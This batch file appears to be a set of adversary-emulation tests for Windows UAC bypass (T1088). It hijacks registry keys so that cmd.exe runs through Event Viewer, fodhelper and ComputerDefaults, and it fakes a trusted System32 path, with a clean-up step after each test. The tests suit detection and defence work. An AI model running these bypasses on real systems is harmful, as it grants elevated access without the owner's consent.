@echo off

echo T1088 - Bypass User Account Control

echo Atomic Test #1 - Bypass UAC using Event Viewer (cmd)
reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f

echo Test #1 - Clean Up
reg.exe delete hkcu\software\classes\mscfile /f


echo Atomic Test #2 - Bypass UAC using Event Viewer (PowerShell) 
powershell -command "New-Item 'HKCU:\software\classes\mscfile\shell\open\command' -Force"
powershell -command "Set-ItemProperty 'HKCU:\software\classes\mscfile\shell\open\command' -Name '(default)' -Value 'C:\Windows\System32\cmd.exe' -Force"
powershell -command "Start-Process 'C:\Windows\System32\eventvwr.msc'


echo Test #2 - Clean Up
powershell -command "Remove-Item 'HKCU:\software\classes\mscfile' -force -Recurse -ErrorAction Ignore"


echo Atomic Test #3 - Bypass UAC using Fodhelper 
powershell -command "reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d 'C:\Windows\System32\cmd.exe' /f"
powershell -command "reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v 'DelegateExecute'"
powershell -command "fodhelper.exe"


echo Test #3 - Clean Up
reg.exe delete hkcu\software\classes\ms-settings /f



echo Atomic Test #4 - Bypass UAC using Fodhelper - PowerShell 
powershell -command "New-Item 'HKCU:\software\classes\ms-settings\shell\open\command' -Force"
powershell -command "New-ItemProperty 'HKCU:\software\classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Force"
powershell -command "Set-ItemProperty 'HKCU:\software\classes\ms-settings\shell\open\command' -Name '(default)' -Value 'C:\Windows\System32\cmd.exe' -Force"
powershell -command "Start-Process 'C:\Windows\System32\fodhelper.exe'"


echo Test #4 - Clean Up
powershell -command "Remove-Item 'HKCU:\software\classes\ms-settings' -force -Recurse -ErrorAction Ignore"



echo Atomic Test #5 - Bypass UAC using ComputerDefaults (PowerShell)
powershell -command "New-Item 'HKCU:\software\classes\ms-settings\shell\open\command' -Force"
powershell -command "New-ItemProperty 'HKCU:\software\classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Force"
powershell -command "Set-ItemProperty 'HKCU:\software\classes\ms-settings\shell\open\command' -Name '(default)' -Value 'C:\Windows\System32\cmd.exe' -Force"
powershell -command "Start-Process 'C:\Windows\System32\ComputerDefaults.exe'"


echo Test #5 - Clean Up
powershell -command "Remove-Item 'HKCU:\software\classes\ms-settings' -force -Recurse -ErrorAction Ignore"

echo Atomic Test #6 - Bypass UAC by Mocking Trusted Directories
mkdir "\\?\C:\Windows \System32\"
copy "C:\Windows\System32\cmd.exe" "\\?\C:\Windows \System32\mmc.exe"
mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"


echo Test #6 - Clean Up
rd "\\?\C:\Windows \" /S /Q
del "c:\testbypass.exe" >nul 2>nul

